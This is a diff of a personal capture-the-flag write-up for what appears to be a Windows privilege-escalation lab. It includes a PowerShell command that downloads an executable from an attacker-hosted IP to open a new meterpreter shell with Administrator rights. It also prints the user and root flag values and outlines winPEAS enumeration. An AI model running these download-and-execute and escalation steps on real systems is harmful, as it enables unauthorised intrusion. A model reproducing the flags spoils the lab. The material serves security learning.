@@ -150,3 +150,35 @@ powershell -c wget "http://10.9.0.124:9090/Message.exe" -outfile "Message.exe"
 
 ![[Pasted image 20251018221427.png]]
 basically i created a new metasploit listener, on a different port, I downloaded the file on the machine, then executed it and gained a new shell on the new metasploit listener 
+![[Pasted image 20251018221830.png]]
+As we can see from the above we have Administrator shell on the machine and have escalated our privileges 
+## Finding the User Flag and root Flag
+Since we are in meterpreter lets use the following to quickly find text files 
+```
+search -f *.txt
+```
+
+```
+cat c:\Users\jeff\Desktop\user.txt
+cat c:\Users\Administrator\Desktop\root.txt 
+```
+
+**FLAG for Jeff** 759bd8af507517bcfaede78a21a73e39
+
+**FLAG for Root** 7e13d97f05f7ceb9881a3eb3d78d3e72
+
+![[Pasted image 20251018222307.png]]
+
+# Using Winpeas for PrivEsc
+Now you know how to pull files from your machine to the victims machine, we can pull winPEAS.bat to the system using the same method! ([You can find winPEAS here](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASbat))
+
+WinPeas is a great tool which will enumerate the system and attempt to recommend potential vulnerabilities that we can exploit. The part we are most interested in for this room is the running processes!
+
+_Tip: You can execute these files by using .\filename.exe_
+
+1. I couldn't be f... to do this path, but it seems straight forward
+	1. Download WinPeas on the Attacker machine and host the file
+	2. Download it from the Target Machine and run it
+	3. View all the details provided by WinPeas
+
+
